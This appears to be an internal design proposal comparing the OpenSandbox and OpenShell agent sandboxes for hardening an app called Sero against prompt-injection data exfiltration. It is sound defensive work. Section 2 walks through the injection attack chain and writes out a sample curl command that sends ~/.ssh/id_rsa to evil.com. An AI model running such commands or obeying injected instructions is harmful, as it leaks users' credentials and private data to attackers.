# Agent Sandbox Security Discovery & Proposal for Sero

**Date:** 2026-03-17
**Status:** Discovery / Proposal
**Subject:** Technical analysis of [OpenSandbox](https://github.com/alibaba/OpenSandbox) (Alibaba) and [OpenShell](https://github.com/NVIDIA/OpenShell) (NVIDIA) for hardening Sero against prompt injection data exfiltration
**Related:** [outstanding-hardening.md](./outstanding-hardening.md), [hardening-plan.md](./hardening-plan.md)

---

## 1. Executive Summary

Sero already has strong container isolation via Apple Containers, but has **critical gaps in network egress control, filesystem scoping, and runtime tool enforcement** that leave it vulnerable to prompt injection attacks that exfiltrate private data. Two major open-source sandbox platforms have been released in March 2026 that directly address these gaps:

- **OpenSandbox** (Alibaba) — egress sidecar with DNS + nftables filtering, Docker/K8s runtimes
- **OpenShell** (NVIDIA) — four-domain policy engine (filesystem, network, process, inference) with kernel-level enforcement via Landlock + seccomp, binary-integrity-verified network proxy, and credential isolation

Neither platform can prevent prompt injection itself — both are **blast radius reducers**. The critical takeaway is that **network-level and kernel-level controls are the only reliable defense against data exfiltration via prompt injection**, because they operate below the LLM layer and cannot be circumvented by manipulating the model.

**OpenShell is the stronger candidate for Sero's long-term security architecture.** It covers all four domains Sero is weak in (filesystem, network, process, credentials), has a more mature policy model (OPA/Rego), and is backed by NVIDIA with enterprise security partnerships (Cisco, CrowdStrike, TrendAI). OpenSandbox's egress sidecar addresses only network egress — one layer of the problem.

**However, both require Docker** — meaning the same Docker migration trade-off applies. The immediate recommendation remains: **harden the existing proxy now** (days of work), then evaluate Docker + OpenShell as the cross-platform migration path.

**Industry context:** The OWASP Top 10 for LLM Applications (2025) ranks prompt injection #1, with it appearing in over 73% of production AI deployments assessed during security audits. The OWASP AI Agent Security Top 10 (2026) lists untrusted code execution as the primary risk.

---

## 2. The Threat: Prompt Injection → Data Exfiltration

The attack chain Sero is vulnerable to:

1. **Injection vector:** Malicious content in a file the agent reads (e.g., a cloned repo's README, a pasted URL, a crafted code comment) contains hidden instructions
2. **Agent compliance:** The LLM follows the injected instructions (reads `~/.ssh/id_rsa`, `~/.gitconfig`, workspace secrets, etc.)
3. **Exfiltration channel:** Agent uses one of several available channels to send data out:
   - `bash` tool: `curl https://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)`
   - Browser tool: Navigate to `https://evil.com/collect?data=...`
   - HTTP requests via the proxy (no URL filtering)
   - DNS exfiltration (encode data in DNS query subdomains)

### Current Sero Defenses (and gaps)

| Layer | Status | Notes |
|-------|--------|-------|
| Container isolation | **Strong** | Apple Container, process-level isolation |
| Filesystem restriction | **Weak** | Agent can read any file in the container, including cross-workspace mounts |
| Git mutation blocking | **Strong** | Command filter blocks mutating git in bash |
| Network egress control | **None** | HTTP proxy forwards ALL requests without filtering |
| URL/domain validation | **None** | Browser tool accepts any URL |
| Secret redaction (outbound) | **Partial** | Redacts known patterns in logs/output, but NOT in bash commands the agent constructs |
| System prompt guardrails | **Soft** | Instructions only — no runtime enforcement |

**The #1 gap is network egress.** The agent can make arbitrary outbound HTTP requests to any domain through the proxy, and can navigate the browser to any URL. This is the primary exfiltration channel that prompt injection attacks exploit.

---

## 3. What OpenSandbox Is

OpenSandbox (released March 2026, Apache 2.0) is Alibaba's general-purpose sandbox platform for AI agent execution. It provides:

- **Multi-language SDKs** (Python, Java/Kotlin, TypeScript on roadmap)
- **Unified sandbox lifecycle API** (create, destroy, execute, file ops)
- **Docker + Kubernetes runtimes** with optional gVisor/Kata/Firecracker isolation
- **execd daemon** — Go-based execution daemon injected into every sandbox container
- **Egress sidecar** — per-sandbox network policy enforcement via DNS filtering + nftables

### Architecture (Four Layers)

```
┌─────────────────────────────────────────┐
│  SDKs Layer (Python, Java, TS)          │  ← Client libraries
├─────────────────────────────────────────┤
│  Specs Layer (OpenAPI)                  │  ← Standardized API contracts
├─────────────────────────────────────────┤
│  Runtime Layer (FastAPI server)         │  ← Sandbox orchestration
├─────────────────────────────────────────┤
│  Sandbox Instances (Docker/K8s + execd) │  ← Isolated execution environments
└─────────────────────────────────────────┘
```

---

## 4. OpenSandbox Security Mechanisms — Deep Dive

### 4.1 Container Isolation (gVisor/Kata/Firecracker)

- **gVisor** interposes a user-space kernel ("Sentry") between the sandbox and host kernel, reducing syscall attack surface from ~400 to ~200
- **Kata Containers** and **Firecracker microVMs** provide VM-level isolation with container ergonomics
- Cold-start under 800ms for gVisor

**Relevance to Sero:** **Low.** Sero already uses Apple Containers which provide equivalent process-level isolation on macOS. gVisor/Kata are Linux-only and would not run on macOS. This component is not useful for Sero.

### 4.2 Egress Sidecar (Network Policy Enforcement) ★ HIGH VALUE

This is the most relevant component. The egress sidecar:

- **Shares the sandbox's network namespace** (sees all its traffic)
- **Layer 1 — DNS Proxy:** Runs on `127.0.0.1:15353`, iptables redirects all port 53 traffic. Returns NXDOMAIN for disallowed domains
- **Layer 2 — nftables Filter:** In `dns+nft` mode, enforces IP-level allow/deny. Resolved IPs for allowed domains added to dynamic allow sets with TTL
- **Default-deny + domain-allow** model — only whitelisted domains are reachable

**Policy format:**
```json
{
  "defaultAction": "deny",
  "egress": [
    { "action": "allow", "target": "*.github.com" },
    { "action": "allow", "target": "*.npmjs.org" },
    { "action": "allow", "target": "registry.yarnpkg.com" },
    { "action": "deny",  "target": "*" }
  ]
}
```

**Runtime API:** Policies can be updated dynamically via HTTP:
- `GET /policy` — retrieve current policy
- `POST /policy` — replace policy
- `PATCH /policy` — merge rules (prepended, so overrides take effect)

**Why this matters for Sero:** A prompt-injected agent trying to `curl https://evil.com/exfil` would get NXDOMAIN at the DNS level and IP-blocked at the nftables level. The agent literally cannot resolve or connect to unauthorized domains.

### 4.3 Resource Limits

CPU, memory, disk, and network bandwidth limits per sandbox. Prevents resource exhaustion from runaway AI-generated code.

**Relevance to Sero:** **Medium.** Apple Containers have some resource controls, but explicit per-sandbox limits would add defense-in-depth.

### 4.4 What OpenSandbox Does NOT Do

Critically, OpenSandbox **does not address prompt injection itself.** It cannot:
- Detect or prevent prompt injection in LLM inputs
- Validate or sanitize agent tool calls before execution
- Restrict filesystem access within a container
- Enforce tool-level permissions (e.g., "agent can read but not write")

OpenSandbox is a **blast radius reducer** — it limits what damage a compromised agent can do, not whether the agent gets compromised.

---

## 5. What OpenShell Is

OpenShell (released March 16, 2026, Apache 2.0) is NVIDIA's open-source runtime for securely executing autonomous AI agents. Announced at GTC 2026 as part of the NemoClaw stack, it provides a comprehensive policy-driven sandbox with kernel-level enforcement. Currently alpha, single-player mode.

- **Declarative YAML policies** with four enforcement domains
- **Kernel-level isolation** via Landlock (filesystem) + seccomp (syscalls) + network namespaces
- **Binary-integrity-verified proxy** — identifies requesting programs via `/proc` + SHA256 hashing
- **OPA/Rego policy engine** — policies evaluated by embedded Open Policy Agent
- **Credential isolation** — secrets injected as env vars at runtime, never on the sandbox filesystem
- **Inference routing** — transparently intercepts AI API calls, strips/rewrites credentials
- **K3s-in-Docker** — entire platform runs as an embedded Kubernetes cluster in a single Docker container

### Architecture

```
┌──────────────────────────────────────────────────────────┐
│  CLI (openshell sandbox create / connect / policy)       │
├──────────────────────────────────────────────────────────┤
│  Gateway (gRPC + HTTP, TLS, SQLite/Postgres)             │
│  ├── Sandbox lifecycle (K8s pod management)              │
│  ├── SSH tunnel gateway (authenticated access)           │
│  ├── Provider/credential management                      │
│  └── Inference bundle resolution                         │
├──────────────────────────────────────────────────────────┤
│  Sandbox Pod                                             │
│  ├── Supervisor (privileged) — sets up isolation          │
│  │   ├── Landlock filesystem rules                        │
│  │   ├── seccomp syscall filter                           │
│  │   ├── Network namespace isolation                      │
│  │   └── Credential injection via gRPC                    │
│  ├── Network Proxy                                        │
│  │   ├── /proc inspection (binary identity)               │
│  │   ├── SHA256 trust-on-first-use verification           │
│  │   ├── OPA policy evaluation (hostname, port, binary)   │
│  │   ├── SSRF protection (blocks internal IP ranges)      │
│  │   ├── L7 inspection (audit + enforce modes)            │
│  │   └── inference.local interception → backend routing   │
│  └── Child Process (unprivileged agent)                   │
├──────────────────────────────────────────────────────────┤
│  K3s Cluster (embedded in single Docker container)       │
└──────────────────────────────────────────────────────────┘
```

### 5.1 OpenShell Security Mechanisms — Deep Dive

#### Four Policy Domains

OpenShell enforces across four distinct domains. Static policies (filesystem, process) are locked at sandbox creation. Dynamic policies (network, inference) are hot-reloadable at runtime via `openshell policy set`.

| Domain | Enforcement | Lifecycle | What it controls |
|--------|-------------|-----------|-----------------|
| **Filesystem** | Landlock (kernel) | Static (locked at creation) | Read/write paths, directory access |
| **Network** | Proxy + OPA | Dynamic (hot-reloadable) | Outbound connections by hostname, port, requesting binary |
| **Process** | seccomp | Static (locked at creation) | Syscall filtering, privilege escalation prevention |
| **Inference** | Proxy interception | Dynamic (hot-reloadable) | AI API routing, credential stripping/rewriting |

#### Network Proxy (vs. OpenSandbox's Egress Sidecar)

OpenShell's proxy is significantly more sophisticated than OpenSandbox's egress sidecar:

- **Binary-level attribution:** Identifies *which program* is making each request via `/proc` inspection and SHA256 hash verification. This means policies can allow `curl` to reach `github.com` but deny the agent process itself.
- **OPA/Rego evaluation:** Policies written in Rego, a full logic language, not just JSON allow/deny lists. Enables complex rules like "allow POST to api.anthropic.com only from the inference router binary."
- **L7 inspection:** Can inspect HTTP request/response content for configured endpoints, with audit (log only) and enforce (block) modes.
- **SSRF protection:** Blocks connections to internal IP ranges by default.
- **Inference interception:** Requests to `inference.local` are transparently routed to configured AI backends with credential rewriting — the sandbox never sees real API keys.

#### Credential Isolation ★ HIGH VALUE FOR SERO

This directly addresses a Sero gap. Currently, Sero injects `GH_TOKEN` and git credentials into container exec calls. OpenShell's model:

1. Credentials stored on the gateway, separate from pod specs
2. Supervisor fetches credentials via gRPC at sandbox start
3. Injected as environment variables into spawned processes only
4. Never written to the sandbox filesystem
5. Auto-discovery scans the host for existing credentials (API keys, config files)

#### Filesystem Isolation via Landlock ★ HIGH VALUE FOR SERO

Landlock is a Linux kernel security module (since 5.13) that enforces per-process filesystem access rules. Unlike container-level mounts, it restricts what the *agent process* can access even within the container:

- Explicit read/write directory allowlists
- Locked at sandbox creation (agent cannot modify its own rules)
- Kernel-enforced (no bypass via shell tricks or `chroot` escapes)

**This directly addresses Sero's filesystem gap** — the agent currently has access to everything in the container including cross-workspace mounts and sensitive paths.

### 5.2 What OpenShell Does NOT Do

Like OpenSandbox, OpenShell does not:
- Detect or prevent prompt injection in LLM inputs
- Validate the semantic intent of agent tool calls
- Provide macOS-native enforcement (Landlock, seccomp are Linux-only)

### 5.3 OpenShell vs. OpenSandbox — Head-to-Head

| Capability | OpenSandbox (Alibaba) | OpenShell (NVIDIA) |
|-----------|----------------------|-------------------|
| **Network egress** | DNS proxy + nftables sidecar | Binary-verified proxy + OPA policies |
| **Filesystem** | None (container-level only) | Landlock kernel enforcement |
| **Process/syscall** | gVisor (optional) | seccomp (always) |
| **Credential mgmt** | None | Full provider system with isolation |
| **Inference routing** | None | Transparent proxy with credential stripping |
| **Policy language** | JSON allow/deny rules | YAML + OPA/Rego (full logic language) |
| **Policy hot-reload** | Yes (HTTP API) | Yes (network + inference domains) |
| **Agent compatibility** | SDK-based (create sandbox via API) | Drop-in (run any agent unmodified) |
| **Runtime** | Docker or K8s | K3s-in-Docker (single container) |
| **Maturity** | Alpha (March 2026) | Alpha (March 2026) |
| **Backing** | Alibaba | NVIDIA + Cisco, CrowdStrike, TrendAI |
| **L7 inspection** | No | Yes (audit + enforce modes) |
| **SSRF protection** | No | Yes (blocks internal IPs) |
| **Binary identity** | No | Yes (/proc + SHA256 verification) |

**Verdict:** OpenShell is the more comprehensive solution. OpenSandbox addresses only network egress; OpenShell covers filesystem, network, process, and inference — all four domains where Sero has gaps.

---

## 6. Feasibility Assessment for Sero Integration

### 6.1 Option A: Adopt Full OpenSandbox Platform — NOT RECOMMENDED

| Factor | Assessment |
|--------|------------|
| Runtime compatibility | **Blocker.** OpenSandbox requires Docker or Kubernetes. Sero uses Apple Containers on macOS. |
| SDK maturity | TypeScript SDK on roadmap, not available yet. Python and Java only. |
| Architecture fit | Would require replacing Sero's entire container layer (lifecycle, tools, file ops, terminals) |
| execd daemon | Duplicates functionality Sero already has (tool execution, file ops, code running) |
| macOS support | **None.** gVisor, nftables, iptables are all Linux-only |

**Verdict:** Architecturally incompatible. Sero's Apple Container model is fundamentally different from Docker/K8s. Migrating would be a ground-up rewrite of `electron/container/` with no clear benefit over the current isolation.

### 6.2 Option B: Adopt the Egress Sidecar Pattern (Immediate Hardening) ★

The egress sidecar's *design pattern* is directly applicable, even though the Linux-specific implementation (iptables, nftables) won't run on macOS.

**Implementation approach — build a Sero-native equivalent:**

#### Phase 1: Proxy-Level Domain Filtering (Low effort, high impact)

Sero already routes ALL container traffic through `ContainerHttpProxy` at `192.168.64.1:19800`. This is the natural enforcement point.

```
Current:  Container → HTTP Proxy → Internet (no filtering)
Proposed: Container → HTTP Proxy → Domain Filter → Internet
```

**Changes to `electron/container/http-proxy.ts`:**

1. **HTTPS CONNECT filtering:** Before establishing the tunnel, check the target hostname against an allowlist. Reject with `403 Forbidden` if not allowed.

2. **HTTP request filtering:** Before forwarding, check `url.hostname` against the allowlist.

3. **Per-workspace policies:** Each workspace gets a domain allowlist based on its needs (e.g., a Node.js project allows `registry.npmjs.org`, `github.com`; a Python project allows `pypi.org`).

```typescript
// Conceptual addition to ContainerHttpProxy
interface EgressPolicy {
  defaultAction: 'allow' | 'deny';
  rules: Array<{ action: 'allow' | 'deny'; target: string }>; // FQDN or wildcard
}

// In CONNECT handler:
server.on('connect', (req, clientSocket, head) => {
  const [host] = (req.url ?? '').split(':');
  if (!this.isAllowed(host)) {
    clientSocket.write('HTTP/1.1 403 Blocked by egress policy\r\n\r\n');
    clientSocket.destroy();
    return;
  }
  // ... existing tunnel logic
});
```

**Effort estimate:** ~100-200 lines of code. No new dependencies. No architectural changes.

**Coverage:** Blocks HTTP/HTTPS exfiltration — the most common channel.

#### Phase 2: DNS-Level Filtering (Medium effort, closes DNS exfiltration)

DNS exfiltration encodes data in subdomain queries (e.g., `base64data.evil.com`). To block this:

1. Run a filtering DNS resolver on the host (or inside the container)
2. Configure container DNS to use it (already done via `/etc/resolv.conf` setup in lifecycle.ts)
3. Only resolve domains matching the allowlist

**macOS-compatible approach:** Use a lightweight DNS proxy (Node.js `dns2` package or similar) bound to the gateway IP. Containers already use configured DNS — just point them at the filtering proxy.

#### Phase 3: Browser Tool URL Validation (Low effort)

Add domain validation to the browser tool in `electron/container/tools-browser.ts`:

- Validate `navigate` action URLs against the workspace egress policy
- Block `javascript:`, `data:` URI schemes
- Block navigation to internal/private IP ranges

#### Phase 4: Filesystem Access Scoping (Medium effort)

Restrict the agent's file access to the workspace directory and explicitly mounted paths:

- Validate paths in `read`, `write`, `edit` tools against an allowlist
- Block access to sensitive paths (`/etc/shadow`, `~/.ssh`, etc.) unless explicitly permitted
- This is independent of OpenSandbox but addresses the same threat

### 6.3 Option C: Migrate to Docker + OpenSandbox — VIABLE, MAJOR EFFORT

If Sero switched from Apple Containers to Docker Desktop for macOS, the full OpenSandbox platform becomes directly usable:

**What this enables:**
- **Full egress sidecar** with DNS + nftables filtering (runs natively in Linux Docker containers)
- **gVisor runtime** via Docker's `--runtime=runsc` flag — stronger syscall-level isolation than standard containers
- **execd daemon** — could replace Sero's custom tool execution layer
- **OpenSandbox lifecycle API** — standardized create/destroy/exec, potentially simplifying `electron/container/`
- **Cross-platform portability** — Docker runs on macOS, Linux, and Windows, removing the Apple Container lock-in

**What changes:**
| Component | Current (Apple Containers) | After (Docker + OpenSandbox) |
|-----------|---------------------------|------------------------------|
| Container runtime | `/usr/local/bin/container` (macOS-only) | Docker Desktop / `docker` CLI |
| Isolation level | Process-level (Apple framework) | Container (Docker) + optional gVisor/Firecracker |
| Network control | Custom HTTP proxy, no filtering | OpenSandbox egress sidecar (DNS + nftables) |
| Tool execution | Custom `container exec` wrappers | OpenSandbox `execd` + Sero tool layer |
| Terminal (PTY) | `container exec -it` via node-pty | `docker exec -it` via node-pty |
| File mounts | `-v host:container` on `container run` | `-v host:container` on `docker run` |
| SSH forwarding | `--ssh` flag on `container run` | Docker's `--mount type=ssh` or agent forwarding |
| Startup time | Native (fast) | Docker Desktop VM overhead (~1-3s cold start) |

**Effort estimate:** This is a significant migration — roughly a rewrite of `electron/container/` (~15-20 files). Key work:
1. Replace all `container` CLI calls with `docker` CLI or Docker Engine API
2. Integrate OpenSandbox server as a sidecar or host service
3. Adapt lifecycle management (container creation, destruction, health checks)
4. Migrate terminal PTY handling from `container exec -it` to `docker exec -it`
5. Port file watcher, bind mounts, and env injection
6. Handle Docker Desktop licensing (free for personal/small business, paid for enterprise)
7. Validate node-pty rebuild works with Docker exec

**Trade-offs:**
- **Pro:** Full OpenSandbox ecosystem, gVisor, cross-platform, community-maintained security updates
- **Pro:** Docker is the industry standard — more tooling, docs, hiring familiarity
- **Con:** Docker Desktop requires a Linux VM on macOS (Hypervisor.framework) — adds memory/CPU overhead
- **Con:** Docker Desktop licensing: free for <$10M revenue / <250 employees, otherwise $24/user/month
- **Con:** Loses Apple Container's native macOS integration (tighter Virtualization.framework integration, no VM overhead)
- **Con:** Migration risk — `electron/container/` is load-bearing infrastructure; bugs here break all agent functionality

**Verdict:** Viable and worth considering as a longer-term strategic move, especially if cross-platform support becomes a priority. However, the immediate security gap (network egress) can be closed much faster with Option B (proxy filtering), and a Docker migration could follow independently.

### 6.4 Option D: Migrate to Docker + OpenShell — RECOMMENDED FOR CROSS-PLATFORM ★★

If Sero switches to Docker (required for both platforms), **OpenShell is the stronger choice** over OpenSandbox:

**What OpenShell gives Sero that OpenSandbox doesn't:**
- **Filesystem restriction** — Landlock enforcement means the agent literally cannot read `~/.ssh`, `/etc/shadow`, or cross-workspace paths unless the policy explicitly allows it. This is Sero's second-biggest gap after network egress.
- **Binary-level network attribution** — Policies can distinguish between `npm install` fetching packages (allowed) and the agent process itself trying to exfiltrate (denied). OpenSandbox's allow/deny is domain-only.
- **Credential isolation** — API keys and tokens managed by the gateway, injected at runtime, never on the sandbox filesystem. Eliminates the risk of agents reading credential files.
- **Inference routing** — AI API calls intercepted and routed through controlled backends. Sero could use this to ensure agent inference never leaks workspace data to unauthorized model providers.
- **seccomp syscall filtering** — Blocks dangerous syscalls (raw sockets, ptrace, etc.) at the kernel level. Prevents the agent from bypassing the proxy with raw network access.
- **Drop-in agent compatibility** — Run any agent unmodified inside the sandbox. No SDK integration needed.

**What changes vs. Option C (OpenSandbox):**

| Factor | OpenSandbox (Option C) | OpenShell (Option D) |
|--------|----------------------|---------------------|
| Migration scope | Rewrite `electron/container/` for Docker | Same rewrite + OpenShell gateway integration |
| Security coverage | Network egress only | Filesystem + network + process + inference |
| Policy model | JSON rules (simple) | YAML + OPA/Rego (powerful, complex) |
| Agent integration | SDK calls (create sandbox, exec) | CLI-driven (create sandbox, run agent) |
| Credential handling | Manual (mount or env vars) | Managed provider system |
| Enterprise support | Alibaba-backed | NVIDIA + Cisco, CrowdStrike, TrendAI |
| Complexity | Moderate | Higher (OPA, gateway, provider system) |

**Effort estimate:** Similar to Option C (~15-20 file rewrite of `electron/container/`), but with additional integration work for the OpenShell gateway and policy system. Offset by not needing to build custom filesystem restrictions, credential isolation, or audit logging — OpenShell provides these out of the box.

**Trade-offs:**
- **Pro:** Most comprehensive security coverage of any option. Four enforcement domains vs. one.
- **Pro:** Enterprise credibility — NVIDIA + Cisco/CrowdStrike/TrendAI partnerships signal long-term investment
- **Pro:** Drop-in agent compatibility — no SDK changes needed in Sero's agent layer
- **Pro:** Credential isolation eliminates an entire class of exfiltration attacks
- **Con:** Alpha maturity — "expect rough edges." Single-player mode only (fine for Sero's use case)
- **Con:** Heavier runtime — K3s-in-Docker is more overhead than OpenSandbox's simpler Docker model
- **Con:** OPA/Rego policies are powerful but have a learning curve
- **Con:** Currently recommends NVIDIA GPU hardware (but is documented as "hardware agnostic")
- **Con:** Same Docker Desktop licensing consideration as Option C

**Verdict:** If Sero is going to do a Docker migration anyway (for cross-platform), OpenShell is the better sandbox to build on. It addresses all four security gaps, not just network egress.

### 6.5 Option E: Run OpenSandbox Egress Sidecar in a Linux VM — POSSIBLE BUT COMPLEX

If Sero wanted to use the actual OpenSandbox egress sidecar binary without a full Docker migration:

1. Run it in a lightweight Linux VM (Apple Containers can run Linux)
2. Route container traffic through the sidecar
3. Manage policies via the sidecar's HTTP API

This is technically possible but adds operational complexity for marginal benefit over Option B's proxy-level filtering. **Superseded by Option D (OpenShell) which covers more domains.**

---

## 7. Relationship to Outstanding Hardening Items

Several items in [outstanding-hardening.md](./outstanding-hardening.md) overlap with or are addressed by this proposal:

| Outstanding Item | Overlap | Notes |
|-----------------|---------|-------|
| F-03: Per-workspace gateway access control | **Complementary** | Gateway scoping controls who can access a workspace; egress policies control what the agent can reach. Both needed. |
| F-10: Shell command concatenation | **Independent** | Defense-in-depth inside the container. Still needed regardless of egress controls. |
| Structured audit log (F-18) | **Directly relevant** | Audit logging of tool calls and network requests is Priority 3 in this proposal's roadmap. |
| IPC input validation with Zod | **Independent** | Protects against renderer-side attacks, not agent-side exfiltration. |
| Extension sandboxing | **Complementary** | Extensions in the renderer are a separate attack surface from agent tool execution. |

---

## 8. Recommended Implementation Roadmap

### Priority 1: Proxy Domain Filtering (Closes primary exfil channel)

- Modify `ContainerHttpProxy` to enforce per-workspace egress policies
- Default policy: deny-all with explicit allowlist
- Standard allowlist: package registries, GitHub, known APIs
- User-configurable per workspace

### Priority 2: Browser URL Validation

- Add domain checks to browser tool `navigate` action
- Block dangerous URI schemes
- Log all navigation attempts for audit

### Priority 3: Tool Call Audit Logging

- Log every tool call with parameters (already partially done via secret redaction)
- Flag suspicious patterns: reading SSH keys, accessing paths outside workspace, curl to unknown domains
- Consider a pre-execution hook that can block suspicious tool calls

### Priority 4: Filesystem Path Restriction

- Validate all file tool paths against workspace boundaries
- Explicit blocklist for sensitive system paths
- Per-workspace mount visibility (don't expose cross-workspace mounts by default)

### Priority 5: Runtime Tool Enforcement

- Move git command filtering from "system prompt instruction" to actual runtime enforcement (already done for bash, but browser/other tools lack it)
- Add rate limiting to network-related tool calls

---

## 9. What These Platforms Teach Us (Design Principles)

Even without adopting either platform wholesale, their architectures validate key principles Sero should adopt:

1. **Default-deny networking:** The most effective defense against exfiltration. Sero's current default-allow proxy is the biggest gap. (Both platforms)

2. **Policy as data, not code:** Egress rules should be declarative (JSON/YAML), not hardcoded. Makes them auditable, user-configurable, and dynamically updatable. (Both platforms)

3. **Defense at the kernel layer, not the prompt layer:** System prompt instructions are trivially bypassed by prompt injection. Kernel-enforced filesystem (Landlock) and syscall (seccomp) controls cannot be circumvented by the LLM. (OpenShell)

4. **Binary-level attribution:** Knowing *which program* is making a request (not just the domain) enables much finer-grained policies. (OpenShell)

5. **Credential isolation:** Secrets should never touch the sandbox filesystem. Inject at runtime, manage centrally. (OpenShell)

6. **Layered filtering:** DNS + IP + application-level + filesystem + syscall — each catches what the others miss. (Both platforms, OpenShell more comprehensive)

7. **Per-sandbox policies:** Different workspaces have different legitimate network needs. One-size-fits-all is either too permissive or too restrictive. (Both platforms)

---

## 10. Strategic Decision: Docker Migration vs. Native Hardening

This proposal surfaces a **fork-in-the-road architectural decision**:

**Path A — Harden current Apple Containers (Option B):**
- Fast to implement (days, not weeks)
- Proxy filtering closes the primary exfiltration channel immediately
- Keeps native macOS performance and tight integration
- Limits Sero to macOS indefinitely
- Security maintenance is on us (custom proxy filtering + filesystem restrictions)

**Path B — Migrate to Docker + OpenShell (Option D):**
- Significant upfront effort (weeks of `electron/container/` rewrite)
- Gets comprehensive four-domain security (filesystem, network, process, inference)
- Enables cross-platform (Linux, Windows)
- Community-maintained security updates from NVIDIA + enterprise partners
- Docker Desktop licensing considerations for commercial use
- Alpha maturity — but so is Sero

**Path C — Migrate to Docker + OpenSandbox (Option C):**
- Same migration effort as Path B
- Weaker security coverage (network egress only, no filesystem/process/credential isolation)
- Simpler architecture (no OPA, no gateway)
- Less enterprise backing

**Recommended approach:** **Do both, sequentially.** Implement proxy-level egress filtering now (Option B, Phase 1) to close the immediate security gap. If cross-platform becomes a priority (open-source adoption, Windows support), evaluate Docker + OpenShell as the migration path — it addresses all four security domains and has stronger enterprise momentum. The proxy filtering code is ~100-200 lines and low-risk; the egress policy data model carries forward to either platform.

**If the cross-platform decision is made, prefer OpenShell over OpenSandbox.** OpenShell's four-domain policy model means Sero would not need to build custom filesystem restrictions, credential isolation, or audit logging — these come built-in. The total integration work is comparable, but the security outcome is significantly stronger.

---

## 11. Conclusion

**Neither platform is a drop-in fit for Sero today** — both require Docker, which means a migration from Apple Containers. However, both validate that Sero's current security model has critical gaps, and both provide proven architectures for closing them.

**Short-term (now):** Add domain-based egress filtering to the existing `ContainerHttpProxy` — ~100-200 lines of TypeScript to block the primary data exfiltration channel. This is independent of the Docker decision and closes Sero's most exploitable gap immediately.

**Long-term (if cross-platform):** Migrate to Docker + OpenShell. OpenShell's four-domain policy model (filesystem via Landlock, network via binary-attributed proxy, process via seccomp, inference via routing) provides comprehensive defense-in-depth that would take months to build natively. The NVIDIA/Cisco/CrowdStrike ecosystem gives confidence in long-term maintenance and enterprise adoption.

**The key insight from both platforms:** Kernel-level and network-level controls are the only reliable defense against prompt injection exfiltration. System prompt instructions, secret redaction, and tool-level guardrails are valuable but fundamentally soft — the kernel is the hard boundary. An agent tricked by prompt injection cannot `Landlock_restrict_self()` its way out of a Landlock policy, and it cannot raw-socket its way around a seccomp filter that blocks `socket(AF_INET, SOCK_RAW, ...)`.

---

## Sources

### OpenShell (NVIDIA)
- [OpenShell GitHub Repository](https://github.com/NVIDIA/OpenShell)
- [OpenShell Architecture (GitHub)](https://github.com/NVIDIA/OpenShell/tree/925160e84891c28ee9c5337461aa875bbba38e23/architecture)
- [NVIDIA OpenShell Documentation](https://docs.nvidia.com/openshell/latest/)
- [OpenShell Architecture Docs](https://docs.nvidia.com/openshell/latest/about/architecture.html)
- [Run Autonomous Agents More Safely with OpenShell — NVIDIA Blog](https://developer.nvidia.com/blog/run-autonomous-self-evolving-agents-more-safely-with-nvidia-openshell/)
- [Securing Agents with NVIDIA OpenShell and Cisco AI Defense — Cisco Blog](https://blogs.cisco.com/ai/securing-enterprise-agents-with-nvidia-and-cisco-ai-defense)
- [Securing Autonomous AI Agents with TrendAI & OpenShell — Trend Micro](https://www.trendmicro.com/en_us/research/26/c/securing-autonomous-ai-agents-with-trendai-and-nvidia-openshell.html)

### OpenSandbox (Alibaba)
- [OpenSandbox GitHub Repository](https://github.com/alibaba/OpenSandbox)
- [OpenSandbox Egress Sidecar Documentation](https://github.com/alibaba/OpenSandbox/blob/main/components/egress/README.md)
- [OpenSandbox Architecture Documentation](https://github.com/alibaba/OpenSandbox/blob/eb98c8fd0284195a705a2035d18492abbc996c23/docs/architecture.md)
- [Alibaba OpenSandbox Announcement — MarkTechPost](https://www.marktechpost.com/2026/03/03/alibaba-releases-opensandbox-to-provide-software-developers-with-a-unified-secure-and-scalable-api-for-autonomous-ai-agent-execution/)
- [Agent Sandboxing: Comparing OpenSandbox vs Docker — SitePoint](https://www.sitepoint.com/ai-agent-sandboxing-guide/)
- [NVIDIA: Practical Security for Sandboxing Agentic Workflows](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/)
- [Google Cloud: Securing AI Agents in Production](https://cloud.google.com/blog/topics/developers-practitioners/agent-factory-recap-securing-ai-agents-in-production)
- [How to Sandbox AI Agents in 2026 — Northflank](https://northflank.com/blog/how-to-sandbox-ai-agents)
- [OWASP LLM Prompt Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html)
- [OpenSandbox Overview — open-sandbox.ai](https://open-sandbox.ai/)
- [5 Code Sandboxes for Your AI Agents — KDnuggets](https://www.kdnuggets.com/5-code-sandbox-for-your-ai-agents)
- [Securing AI Agents: The Essential Guide — Nightfall AI](https://www.nightfall.ai/ai-security-101/securing-ai-agents)
